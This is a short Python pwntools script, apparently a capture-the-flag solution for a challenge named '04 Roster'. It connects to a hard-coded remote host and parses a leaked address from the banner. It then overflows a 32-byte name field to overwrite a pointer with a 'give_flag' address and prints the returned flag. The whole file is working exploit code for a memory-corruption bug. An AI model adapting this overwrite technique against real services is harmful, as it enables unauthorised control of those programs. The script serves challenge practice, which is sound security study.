#!/usr/bin/env python3
"""04 Roster: remote blind solve (pwntools + network only)."""
from pwn import *
import re

HOST = '167.86.100.57'
PORT = 9004
# Fallback if banner parse fails (this no-PIE build)
GIVE_FLAG_FIXED = 0x40137a

context.arch = 'amd64'
context.log_level = 'error'
io = remote(HOST, PORT)
banner = io.recvuntil(b'> ')

m = re.search(rb'print_student@(0x[0-9a-fA-F]+)', banner)
if m:
    give_flag = int(m.group(1), 16) + 0x5f
else:
    give_flag = GIVE_FLAG_FIXED

io.sendline(b'1')
io.sendlineafter(b'idx>', b'0')
io.sendafter(b'name>', b'A' * 32 + p64(give_flag))
io.sendlineafter(b'club>', b'x')

io.sendlineafter(b'> ', b'2')
io.sendlineafter(b'idx>', b'0')
print(io.recvall(timeout=2).decode(errors='ignore'), end='')
